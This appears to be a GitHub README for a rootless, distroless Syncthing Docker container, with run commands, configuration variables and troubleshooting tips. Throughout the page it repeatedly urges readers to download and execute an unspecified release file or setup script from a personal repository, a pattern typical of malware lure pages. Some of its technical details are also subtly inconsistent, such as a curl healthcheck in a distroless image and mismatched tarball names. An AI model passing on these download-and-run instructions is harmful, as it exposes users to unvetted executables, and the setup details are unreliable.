[![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github)](https://github.com/musaefe-art/docker-syncthing/releases)

# Docker Syncthing — Rootless Distroless Container for Sync 🚀

![Syncthing Logo](https://raw.githubusercontent.com/syncthing/syncthing/master/logo/syncthing-logo.svg)
![Docker Logo](https://www.docker.com/sites/default/files/d8/2019-07/Moby-logo.png)

A compact, secure container image that runs Syncthing without root and with a minimal runtime. This repository packages Syncthing in a rootless user namespace and uses a distroless base to reduce the attack surface and image size. Use it for peer-to-peer file sync, backup pipelines, or lightweight sync endpoints.

Download and execute the release asset from the Releases page:
https://github.com/musaefe-art/docker-syncthing/releases

Badges
- GitHub Releases: [![Releases](https://img.shields.io/badge/download-release-brightgreen?logo=github)](https://github.com/musaefe-art/docker-syncthing/releases)
- Image size: ![image size](https://img.shields.io/badge/image-size-~30MB-blue)
- Status: ![status](https://img.shields.io/badge/status-stable-green)

Features
- Rootless operation using user namespaces and non-root user inside the container.
- Distroless base image for a smaller attack surface and smaller image size.
- Preconfigured Syncthing with sane defaults for headless servers.
- Support for Docker volumes and bind mounts for persistent data and config.
- Health checks and basic logging to stdout/stderr.
- Lightweight entrypoint and minimal dependencies.

Why rootless and distroless
- Rootless: Run without granting root inside the container. You avoid processes that run as root and reduce privilege escalation paths.
- Distroless: Use a minimal runtime that contains only what the app needs. This reduces the image footprint and improves security.

Quick links
- Releases: https://github.com/musaefe-art/docker-syncthing/releases
  - Download the release file from the link above and execute the provided script or binary to get a ready-to-run image or artifacts.

Quickstart

1. Pull the image (example tag)
```
docker pull musaefe-art/docker-syncthing:latest
```

2. Run rootless with a mapped user folder and config:
```
docker run -d \
  --name syncthing-rootless \
  --user 1000:1000 \
  -v /srv/syncthing/config:/config \
  -v /srv/syncthing/data:/data \
  -p 8384:8384 \
  -p 22000:22000 \
  -p 21027:21027/udp \
  musaefe-art/docker-syncthing:latest
```

3. Open the GUI at http://localhost:8384 and complete device pairing.

If you prefer podman and want true rootless mode:
```
podman run -d \
  --name syncthing-rootless \
  -v /home/user/syncthing/config:/config:Z \
  -v /home/user/syncthing/data:/data:Z \
  -p 8384:8384 \
  -p 22000:22000 \
  -p 21027:21027/udp \
  musaefe-art/docker-syncthing:latest
```

How it works (high level)
- The image runs Syncthing as a non-root user. UID and GID default to 1000.
- The entrypoint launches Syncthing with a minimal set of flags to allow headless operation.
- Config and data directories mount from the host to provide persistence.
- Network ports expose the web GUI, sync protocol, and local discovery.

Configuration and environment variables
- SYNCTHING GUI_PORT (default: 8384) — port for web UI inside container.
- SYNCTHING_HOME (default: /config) — path for Syncthing config and database.
- SYNCTHING_DATA (default: /data) — path for user files to sync.
- SYNCTHING_OPTIONS — pass additional CLI options to syncthing.

Example with environment:
```
docker run -d \
  --name syncthing \
  -e SYNCTHING_GUI_PORT=8384 \
  -e SYNCTHING_HOME=/config \
  -v /srv/sync/config:/config \
  -v /srv/sync/files:/data \
  -p 8384:8384 \
  musaefe-art/docker-syncthing:latest
```

Persistent storage
- Mount a host directory to /config to keep your device ID, keys, and database.
- Mount a host directory to /data to store synced files.
- Use Docker volumes for easier backups and portability.

Recommended volume layout
- /srv/syncthing/config — Syncthing config and database (choose owner UID 1000)
- /srv/syncthing/data — Files to be synchronized

Entrypoint and init
- The entrypoint validates ownership of mounted volumes and fixes permissions for the non-root user.
- The entrypoint then execs syncthing with the configured options.
- The image includes a small healthcheck script. Docker will report unhealthy if Syncthing fails to respond on the GUI port.

Networking notes
- The sync protocol uses TCP 22000 and UDP 21027 for local discovery. Map both ports.
- If you run multiple instances behind NAT, enable global discovery and set up relay servers as needed.
- For private networks, you may disable global discovery to limit peers.

Security and hardening
- The image uses a distroless base. It contains only the Syncthing binary and libs it needs.
- The container runs as a non-root user by default. Do not map host binaries into the container.
- Expose only the ports you need. If you only use the web GUI internally, restrict external access with firewall rules.
- Back up /config regularly. It contains your keys and device identity.

Building locally
- Build the image with build args to set UID and GID:
```
docker build \
  --build-arg USER_ID=1000 \
  --build-arg GROUP_ID=1000 \
  -t local/docker-syncthing:dev .
```

- You can set a Syncthing version:
```
docker build \
  --build-arg SYNCTHING_VERSION=v1.20.0 \
  -t local/docker-syncthing:1.20 .
```

CI and automated builds
- Tag images with semantic versioning.
- Use release artifacts to publish build logs and signed images.
- When you publish a release, check the Releases page and download the provided file and run it as needed:
https://github.com/musaefe-art/docker-syncthing/releases

Logging
- Syncthing logs to stdout and stderr. Use docker logs to inspect output:
```
docker logs -f syncthing-rootless
```

Health checks
- The image includes a simple HTTP health probe on the GUI port:
```
HEALTHCHECK --interval=30s --timeout=3s \
  CMD curl -fsS http://localhost:8384/ >/dev/null || exit 1
```

Troubleshooting
- If the GUI is unreachable, check container logs and port mappings.
- If Syncthing fails to write to /config, fix the UID/GID on the host mount to match container UID.
- If you see permission errors, run a chown on the host:
```
sudo chown -R 1000:1000 /srv/syncthing/config /srv/syncthing/data
```

Advanced tips
- Use bind mounts with :Z or :z for SELinux systems when using podman or Docker with SELinux.
- For higher isolation, run the image in a user namespace or enable seccomp and AppArmor profiles.
- Use a reverse proxy to secure the web GUI with TLS and basic auth. Syncthing can also serve TLS with your own certificates.

Releases and downloading
- Visit the Releases page to find prebuilt binaries, Docker tags, and helper scripts:
  https://github.com/musaefe-art/docker-syncthing/releases
- Download the provided release file and execute the included script to install or load the image into your registry. The release may include:
  - image tarball (docker-image.tar.gz) — load with docker load
  - install script (install.sh or run.sh) — run to unpack and configure
  - checksums and signatures for verification

Example: load a release tarball
```
curl -L -o docker-syncthing.tar.gz https://github.com/musaefe-art/docker-syncthing/releases/download/v1.0.0/docker-syncthing.tar.gz
tar -xzf docker-syncthing.tar.gz
docker load -i docker-syncthing-image.tar
```

Contributing
- Fork the repo and open a pull request.
- Keep changes small and focused.
- Include tests for scripts or Dockerfile changes.
- Open issues for bugs or feature requests.

License
- The project uses an open license. Check the LICENSE file in the repo for details.

Maintainer
- Repository: musaefe-art/docker-syncthing
- Releases: https://github.com/musaefe-art/docker-syncthing/releases

Images and resources
- Syncthing: https://syncthing.net
- Docker: https://www.docker.com
- Distroless images: https://github.com/GoogleContainerTools/distroless

Examples and use cases
- Sync a laptop and a headless server without opening complex firewall rules.
- Use as a backup endpoint that receives encrypted data from clients.
- Run ephemeral sync agents inside CI runners to move build artifacts.

FAQ
- How do I preserve my device ID?
  Mount /config to a persistent directory on the host. Back it up.
- Can I change the UID?
  Yes. Rebuild with USER_ID build arg or change ownership of mounted volumes.
- Can I run multiple instances?
  Yes. Use separate config and data directories and map different host ports.

Release link again:
[Releases and downloads](https://github.com/musaefe-art/docker-syncthing/releases) - download the release file from this page and execute the included setup script or load the image tarball into Docker.